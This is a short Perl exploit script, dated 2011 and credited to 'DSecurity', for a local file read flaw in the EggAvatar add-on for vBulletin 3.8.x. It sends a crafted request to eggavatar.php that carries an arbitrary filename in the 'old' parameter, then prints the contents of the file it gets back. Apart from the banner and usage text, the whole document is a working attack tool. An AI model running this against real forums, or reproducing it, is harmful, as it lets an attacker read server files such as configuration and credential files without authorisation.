#!/usr/bin/env perl
use LWP::UserAgent;
sub banner{
print "###################################\n";
print "############ DSecurity ############\n";
print "###################################\n";
print "# Email:dsecurity.vn[at]gmail.com #\n";
print "###################################\n";
}
if(@ARGV<2){
	print "Usage: $0 address filename\n";
	print "Example: $0 http://localhost/vbb test test index.php\n";
	exit();
}
$ua=LWP::UserAgent->new();
$ua->agent("DSecurity");

&banner;
print "\n#############################################################################################################\n";
print "# EggAvatar for vBulletin 3.8.x local file read                                      		           #\n";
print "# Date:07-03-2011                                                                                           #\n";
print "# Author: DSecurity					                                                    #\n";
print "# Software Link: http://www.vbteam.info/vb-3-8-x-addons-and-template-modifications/19079-tk-egg-avatar.html #\n";
print "# Version: 2.3.2                                                                                            #\n";
print "# Tested on: vBulletin 3.8.0                                                                                #\n";
print "#############################################################################################################\n";


#Get info
my $response = $ua->get($ARGV[0].'/eggavatar.php?eggavatar.php?do=showeggs&u=1&old='.$ARGV[1]);
 
 if ($response->is_success) {
     print $response->decoded_content;  # or whatever
}
 else {
     die $response->status_line;
 }